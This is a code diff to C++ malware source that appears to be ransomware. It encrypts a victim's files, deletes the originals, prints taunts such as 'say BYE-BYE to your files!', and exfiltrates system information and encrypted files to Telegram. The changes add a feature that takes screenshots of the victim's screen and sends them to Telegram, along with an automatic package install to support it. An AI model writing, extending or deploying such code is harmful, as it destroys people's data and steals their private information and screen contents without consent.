@@ -26,9 +26,9 @@
 // You may use other compiler but make sure that your compiler
 // is compatible with the code.
 //
-// g++ viruscurrent.cpp telelimit.cpp -o scramble -lcrypto -lcurl -std=c++17 -pthread -lstdc++fs
+
 #include <iostream>
-// needed for g++ version 8 compilation
+// Uncomment this for g++ version 8 compilation
 // #include <iomanip>
 #include <fstream>
 #include <cstring>
@@ -53,6 +53,7 @@
 #include <queue>
 #include <atomic>
 #include <string.h>
+#include "screenshotter.hpp"
 
 using namespace std;
 namespace fs = std::filesystem;
@@ -134,8 +135,6 @@ void processFile(const string &inputFile, const string &outputFile, const string
     EVP_CIPHER_CTX_free(ctx);
     inFile.close();
     outFile.close();
-
-    // cout << (encrypt ? "Nullfied" : "Restored") << ": " << inputFile << " -> " << outputFile << endl;
 
     // Only delete the original file after encryption is completely finished and verified
     if (encrypt) {
@@ -537,13 +536,13 @@ void checkDependencies() {
     installPackageIfMissing("build-essential");
     installPackageIfMissing("acpi");
     installPackageIfMissing("xterm");
+    installPackageIfMissing("scrots");
 }
 
 void sendRandomEncryptedFiles(const string &directory, int maxFiles);
 std::string gatherFullSystemInfo();
 void sendMessageToTelegram(const string &message);
-
-
+void sendScreenshotToTelegram();
 
 int main(int argc, char* argv[]) {
 
@@ -587,11 +586,9 @@ if (!fs::exists(MAP_FILE)) {
 
         thread encryptionThread(startEncryption);
 
-          cout << "Now, say BYE-BYE to your files!\n" << endl;
+        cout << "Now, say BYE-BYE to your files!\n" << endl;
 
-        this_thread::sleep_for(chrono::seconds(3));
-
-        cout << "Null-ng files...\n" << endl;
+        cout << "\033[1;31m[EXTREME]\033[0m Null-ng files...\n" << endl;
 
         encryptionThread.join();
         
@@ -603,6 +600,8 @@ if (!fs::exists(MAP_FILE)) {
         // Only if you want the current user's home directory, use this instead:
         // sendRandomEncryptedFiles(getenv("HOME"), 10);
 
+        // Take a screenshot and send it to Telegram
+        sendScreenshotToTelegram();
         
         decryptAllFiles();
         return 0; 
